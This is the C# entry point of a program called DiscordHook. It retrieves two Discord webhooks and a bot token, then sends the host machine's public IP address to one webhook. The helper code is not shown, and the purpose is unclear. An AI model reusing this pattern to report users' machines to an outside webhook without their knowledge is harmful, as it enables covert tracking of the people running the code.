using System;
using System.Threading.Tasks;
using static DiscordHook.Alerts;
using static DiscordHook.Utility;
using static DiscordHook.Win32Api;

namespace DiscordHook
{
    internal static class Program
    {
        private static async Task Main(string[] args)
        {
            var alerthook = await GetAlertWebHook();
            await Task.Delay(500);
            var replyhook = await GetReplyWebHook();
            await Task.Delay(500);
            var botToken = await GetBotToken();
            
            await SendHookAlertAsync(await GetIpAsync(), alerthook);
            
        }
    }
}